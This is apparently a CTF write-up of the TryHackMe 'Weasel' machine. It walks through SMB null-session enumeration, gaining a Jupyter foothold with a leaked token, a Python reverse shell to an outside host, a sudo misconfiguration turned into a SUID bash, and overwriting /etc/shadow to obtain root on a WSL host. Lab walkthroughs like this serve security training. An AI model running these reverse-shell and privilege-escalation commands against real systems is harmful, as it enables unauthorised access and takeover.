---
title: Weasel TryHackMe Writeup
tags: [writeup, tryhackme, windows, ctf, jupyter, mount]
style: border
color: success
description: ""
---

![logo](../assets/img/weasel-tryhackme-writeup/1.jpg)

## Scanning
We scan the open ports with the **nmap** tool with scripts and software versions.

```
> nmap -sVC 10.10.81.101
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 10:57 CEST
Nmap scan report for 10.10.81.101
Host is up (0.050s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 2b17d88a1e8c99bc5bf53d0a5eff5e5e (RSA)
|   256 3cc0fdb5c157ab75ac8110aee298120d (ECDSA)
|_  256 e9f030bee6cfeffe2d1421a0ac457b70 (ED25519)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: DEV-DATASCI-JUP
|   NetBIOS_Domain_Name: DEV-DATASCI-JUP
|   NetBIOS_Computer_Name: DEV-DATASCI-JUP
|   DNS_Domain_Name: DEV-DATASCI-JUP
|   DNS_Computer_Name: DEV-DATASCI-JUP
|   Product_Version: 10.0.17763
|_  System_Time: 2023-05-20T08:57:46+00:00
| ssl-cert: Subject: commonName=DEV-DATASCI-JUP
| Not valid before: 2023-03-12T11:46:50
|_Not valid after:  2023-09-11T11:46:50
|_ssl-date: 2023-05-20T08:57:54+00:00; -1s from scanner time.
8888/tcp open  http          Tornado httpd 6.0.3
| http-title: Jupyter Notebook
|_Requested resource was /login?next=%2Ftree%3F
| http-robots.txt: 1 disallowed entry 
|_/ 
|_http-server-header: TornadoServer/6.0.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-05-20T08:57:51
|_  start_date: N/A
```

## Enumeration
Accessing the only web service through port *8888*, we find the *Jupyter Notebook 6.0.3* software.

To access it, we need to know the password or token, so we will continue investigating the rest of the services, leaving brute force as the last option.

![](../assets/img/weasel-tryhackme-writeup/2.png)

We go to the samba service, we test with null session and we see that we can see a share called *datasci-team*.

```
> smbclient -N -L 10.10.81.101

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        datasci-team    Disk      
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.81.101 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

We repeat null session with share *datasci-team*, we can see a lot relevant files:
```
> smbclient -N //10.10.81.101/datasci-team
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Aug 25 17:27:02 2022
  ..                                  D        0  Thu Aug 25 17:27:02 2022
  .ipynb_checkpoints                 DA        0  Thu Aug 25 17:26:47 2022
  Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv      A      146  Thu Aug 25 17:26:46 2022
  misc                               DA        0  Thu Aug 25 17:26:47 2022
  MPE63-3_745-757.pdf                 A   414804  Thu Aug 25 17:26:46 2022
  papers                             DA        0  Thu Aug 25 17:26:47 2022
  pics                               DA        0  Thu Aug 25 17:26:47 2022
  requirements.txt                    A       12  Thu Aug 25 17:26:46 2022
  weasel.ipynb                        A     4308  Thu Aug 25 17:26:46 2022
  weasel.txt                          A       51  Thu Aug 25 17:26:46 2022

                15587583 blocks of size 4096. 8941726 blocks available
smb: \> 
```

We see a file called *jupyter-token.txt*, this file containt the jupyter-token session for access to administration panel:

```
smb: \> cd misc
smb: \misc\> dir
  .                                  DA        0  Thu Aug 25 17:26:47 2022
  ..                                 DA        0  Thu Aug 25 17:26:47 2022
  jupyter-token.txt                   A       52  Thu Aug 25 17:26:47 2022

                15587583 blocks of size 4096. 8941613 blocks available
```

#### Evidence Jupyter token
```
> cat jupyter-token.txt
06********************************
```

## Exploitation
We change the password on *Jupyter* administration panel with the jupyter token previous.

![](../assets/img/weasel-tryhackme-writeup/3.png)

We can see the same files previous:

![](../assets/img/weasel-tryhackme-writeup/4.png)

We look for possible exploits for RCE (*Remote Code Execution*), we find this interesting links:

- [https://github.com/google/security-research/security/advisories/GHSA-c469-p3jp-2vhx](https://github.com/google/security-research/security/advisories/GHSA-c469-p3jp-2vhx)
- [https://blog.jupyter.org/cve-2021-32797-and-cve-2021-32798-remote-code-execution-in-jupyterlab-and-jupyter-notebook-a70fae0d3239](https://blog.jupyter.org/cve-2021-32797-and-cve-2021-32798-remote-code-execution-in-jupyterlab-and-jupyter-notebook-a70fae0d323)
- [https://security.snyk.io/vuln/SNYK-PYTHON-IPYCACHE-173995](https://security.snyk.io/vuln/SNYK-PYTHON-IPYCACHE-173995)

Finally, we can use the terminal option for system access, we can execute a reverse shell to work for comfortably:

#### Reverse shell code
```python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.9.41.86",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```
We can see that we have access to the *sudo* command and we can execute a couple of options:

![](../assets/img/weasel-tryhackme-writeup/5.png)

```
python3 -c "import pty; pty.spawn('/bin/bash')"
(base) dev-datasci@DEV-DATASCI-JUP:~$ sudo -l
Matching Defaults entries for dev-datasci on DEV-DATASCI-JUP:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dev-datasci may run the following commands on DEV-DATASCI-JUP:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /home/dev-datasci/.local/bin/jupyter, /bin/su dev-datasci -c *
(base) dev-datasci@DEV-DATASCI-JUP:~$ 
```

We can see a *dev-datasci-lowpriv_id_ed25519* file, this file with contain the private key for *SSH* connection with *dev-datasci-lowpriv* user:

```
(base) dev-datasci@DEV-DATASCI-JUP:~$ ls                            
anaconda3  anacondainstall.sh  datasci-team  dev-datasci-lowpriv_id_ed25519
(base) dev-datasci@DEV-DATASCI-JUP:~$ cat dev-datasci-lowpriv_id_ed25cat dev-datasci-lowpriv_id_ed25519
cat dev-datasci-lowpriv_id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAAB<SNIP>
VQAQI=
-----END OPENSSH PRIVATE KEY-----
(base) dev-datasci@DEV-DATASCI-JUP:~$ 
```

We connect via *SSH* and with the private key, and we can read the flag of user:
```
> ssh dev-datasci-lowpriv@10.10.81.101 -i id_rsa
Microsoft Windows [Version 10.0.17763.3287]
(c) 2018 Microsoft Corporation. All rights reserved.
   
dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv>dir 
 Volume in drive C has no label.           
 Volume Serial Number is 8AA3-53D1         
                                           
 Directory of C:\Users\dev-datasci-lowpriv 
                                           
08/25/2022  06:08 AM    <DIR>          .   
08/25/2022  06:08 AM    <DIR>          ..
08/25/2022  06:20 AM    <DIR>          .ssh
08/25/2022  05:22 AM    <DIR>          3D Objects
08/25/2022  05:22 AM    <DIR>          Contacts
08/25/2022  07:39 AM    <DIR>          Desktop
08/25/2022  05:22 AM    <DIR>          Documents
08/25/2022  05:22 AM    <DIR>          Downloads
08/25/2022  05:22 AM    <DIR>          Favorites
08/25/2022  05:22 AM    <DIR>          Links
08/25/2022  05:22 AM    <DIR>          Music
08/25/2022  05:22 AM    <DIR>          Pictures
08/25/2022  05:22 AM    <DIR>          Saved Games
08/25/2022  05:22 AM    <DIR>          Searches
08/25/2022  05:22 AM    <DIR>          Videos
               0 File(s)              0 bytes
              15 Dir(s)  36,626,427,904 bytes free

dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv\Desktop>dir 
 Volume in drive C has no label.                   
 Volume Serial Number is 8AA3-53D1                 
                                                   
 Directory of C:\Users\dev-datasci-lowpriv\Desktop 
                                                   
08/25/2022  07:39 AM    <DIR>          .           
08/25/2022  07:39 AM    <DIR>          ..
08/25/2022  05:21 AM        28,916,488 python-3.10.6-amd64.exe
08/25/2022  07:40 AM                27 user.txt
               2 File(s)     28,916,515 bytes
               2 Dir(s)  36,626,423,808 bytes free

dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv\Desktop>type user.txt 
THM{***************************}  
```


## Privilege Escalation

We run **winpeas** tool and we enumerate the password for *dev-datasci-lowpriv* user 

```
+----------¦ Looking for AutoLogon credentials                                                                                                                           
    Some AutoLogon credentials were found                                                                                                                                       
    DefaultDomainName             :  DEV-DATASCI-JUP                                                                                                                        
    DefaultUserName               :  dev-datasci-lowpriv                                                                                                                    
    DefaultPassword               :  ****************************
```
We test the credentials in samba and list the permissions in shares:

```
> crackmapexec smb 10.10.81.101 -u Dev-datasci-lowpriv -p '********************' --shares
SMB         10.10.81.101    445    DEV-DATASCI-JUP  [*] Windows 10.0 Build 17763 x64 (name:DEV-DATASCI-JUP) (domain:DEV-DATASCI-JUP) (signing:False) (SMBv1:False)
SMB         10.10.81.101    445    DEV-DATASCI-JUP  [+] DEV-DATASCI-JUP\Dev-datasci-lowpriv:******************** 
SMB         10.10.81.101    445    DEV-DATASCI-JUP  [+] Enumerated shares
SMB         10.10.81.101    445    DEV-DATASCI-JUP  Share           Permissions     Remark
SMB         10.10.81.101    445    DEV-DATASCI-JUP  -----           -----------     ------
SMB         10.10.81.101    445    DEV-DATASCI-JUP  ADMIN$                          Remote Admin
SMB         10.10.81.101    445    DEV-DATASCI-JUP  C$                              Default share
SMB         10.10.81.101    445    DEV-DATASCI-JUP  datasci-team    READ,WRITE      
SMB         10.10.81.101    445    DEV-DATASCI-JUP  IPC$            READ            Remote IPC
```
In addition, **winpeas** tool find a Windows local privilege with *.msi* files:
```
+----------¦ Checking AlwaysInstallElevated                                                                                                                              
+  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated                                                         
    AlwaysInstallElevated set to 1 in HKLM!                                                                                                                                     
    AlwaysInstallElevated set to 1 in HKCU! 
```

After several tests, it seems that it doesn't work, so we go back through the steps and we find something interesting, and that is that there is a comma between the two commands, something that I ignored at the first moment.
```
(base) dev-datasci@DEV-DATASCI-JUP:~$ sudo -l
Matching Defaults entries for dev-datasci on DEV-DATASCI-JUP:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dev-datasci may run the following commands on DEV-DATASCI-JUP:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /home/dev-datasci/.local/bin/jupyter, /bin/su dev-datasci -c *
(base) dev-datasci@DEV-DATASCI-JUP:~$ 
```

We see that we have read and write permissions on this directory, but the file *jupyter* is not there, so I generate a bash script to execute it later and apply elevated privileges on a bash.
```
ls -lna /home/dev-datasci/.local/bin/
total 0
drwxrwxrwx 1 1000 1000 4096 Aug 25  2022 .
drwx------ 1 1000 1000 4096 Aug 25  2022 ..
-rwxrwxrwx 1 1000 1000  216 Aug 25  2022 f2py
-rwxrwxrwx 1 1000 1000  216 Aug 25  2022 f2py3
-rwxrwxrwx 1 1000 1000  216 Aug 25  2022 f2py3.8
(base) dev-datasci@DEV-DATASCI-JUP:~$ 

/usr/bin/echo '#!/usr/bin/bash' >> jupyter
(base) dev-datasci@DEV-DATASCI-JUP:~/.local/bin$ cat jupyter
#!/usr/bin/bash
(base) dev-datasci@DEV-DATASCI-JUP:~/.local/bin$ /usr/bin/echo 'chmod u+s /bin/bash' >> jup/usr/bin/echo 'chmod u+s /bin/bash' >> jupyter
/usr/bin/echo 'chmod u+s /bin/bash' >> jupyter
(base) dev-datasci@DEV-DATASCI-JUP:~/.local/bin$ cat jupyter
#!/usr/bin/bash
chmod u+s /bin/bash

(base) dev-datasci@DEV-DATASCI-JUP:~/.local/bin$ chmod +x jupyter
```
We run the sudo command, then we run the **bash** with *-p* to get the privileges, but we see that there is no flag, as this must be found on the desktop of the Windows machine.

```
sudo /home/dev-datasci/.local/bin/jupyter
(base) dev-datasci@DEV-DATASCI-JUP:~/.local/bin$ bash -p
bash-5.0# id
id
uid=1000(dev-datasci) gid=1000(dev-datasci) euid=0(root) groups=1000(dev-datasci),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev)
bash-5.0# ls -lna /root
ls -lna /root
total 4
drwx------ 1 0 0 4096 Aug 25  2022 .
drwxr-xr-x 1 0 0 4096 Aug 25  2022 ..
-rw-r--r-- 1 0 0 3106 Dec  5  2019 .bashrc
drwxr-xr-x 1 0 0 4096 Aug 25  2022 .local
-rw-r--r-- 1 0 0  161 Dec  5  2019 .profile
bash-5.0# 
```
We continue enumerating the machine, we see that there are remains of a mount of the */mnt/c* drive, so we are probably in a virtualized **linux** with **wsl2**, so I tried to mount the drive, but it is only allowed for the root user.
```
bash-5.0# ls -lna /mnt
ls -lna /mnt
total 0
drwxr-xr-x 1 0 0 4096 Aug 25  2022 .
drwxr-xr-x 1 0 0 4096 Aug 25  2022 ..
drwxrwxrwx 1 0 0 4096 Aug 25  2022 c

bash-5.0# ls -lna /mnt/c
ls -lna /mnt/c
total 0
drwxrwxrwx 1 0 0 4096 Aug 25  2022 .
drwxr-xr-x 1 0 0 4096 Aug 25  2022 ..

bash-5.0# mount -t drvfs c: /mnt/c
mount -t drvfs c: /mnt/c                                                                                                                               
mount: only root can use "--types" option
bash-5.0# 

```

But well, if we are root, we have read and write permissions to the */etc/shadow* file, so we can create a hash of a password and modify the file to later authenticate as root.

We download a copy of the shadow file, generate a hash and insert it in the shadow, then upload and replace it (I will show only the generation of the hash, the rest we should already know).

```
> mkpasswd -m SHA-512 **********

$6$EcqHi9.Vr***********************************************1If7s0

> nano shadow
root:$6$EcqHi9.Vr***********************************************1If7s0:19331:0:99999:7:::
<SNIP>
```

Replace the shadow file with that of the machine, authenticate as the root user, mount the **wsl** drive and read the administrator flag.

```
bash-5.0# su root
Password:

root@DEV-DATASCI-JUP:/tmp# id
uid=0(root) gid=0(root) groups=0(root)

root@DEV-DATASCI-JUP:/tmp# mount -t drvfs c: /mnt/c

root@DEV-DATASCI-JUP:/tmp# ls -lna /mnt/c

ls: cannot read symbolic link '/mnt/c/Documents and Settings': Permission denied
ls: cannot access '/mnt/c/pagefile.sys': Permission denied
ls: '/mnt/c/System Volume Information': Permission denied
total 0
drwxrwxrwx 1 0 0 4096 Aug 25  2022 '$Recycle.Bin'
drwxrwxrwx 1 0 0 4096 Mar 14 04:14  .
drwxr-xr-x 1 0 0 4096 Aug 25  2022  ..
lrwxrwxrwx 1 0 0   12 Aug 25  2022 'Documents and Settings'
drwxrwxrwx 1 0 0 4096 Aug 25  2022  PerfLogs
drwxrwxrwx 1 0 0 4096 Aug 25  2022 'Program Files'
drwxrwxrwx 1 0 0 4096 Aug 25  2022 'Program Files (x86)'
drwxrwxrwx 1 0 0 4096 Mar 13 04:47  ProgramData
drwxrwxrwx 1 0 0 4096 Aug 25  2022  Recovery
d--x--x--x 1 0 0 4096 Aug 25  2022 'System Volume Information'
drwxrwxrwx 1 0 0 4096 Aug 25  2022  Users
drwxrwxrwx 1 0 0 4096 Mar 13 05:05  Windows
drwxrwxrwx 1 0 0 4096 May 20 09:35  datasci-team
-????????? ? ? ?    ?            ?  pagefile.sys
root@DEV-DATASCI-JUP:/tmp# 

root@DEV-DATASCI-JUP:/mnt/c/users/administrator# cd Desktop

root@DEV-DATASCI-JUP:/mnt/c/users/administrator/Desktop# ls

 ChromeSetup.exe                banner.txt                root.txt
 Ubuntu2004-220404.appxbundle   desktop.ini
'Visual Studio Code.lnk'        python-3.10.6-amd64.exe
root@DEV-DATASCI-JUP:/mnt/c/users/administrator/Desktop# cat root.txt
THM{**********************}

root@DEV-DATASCI-JUP:/mnt/c/users/administrator/Desktop#
```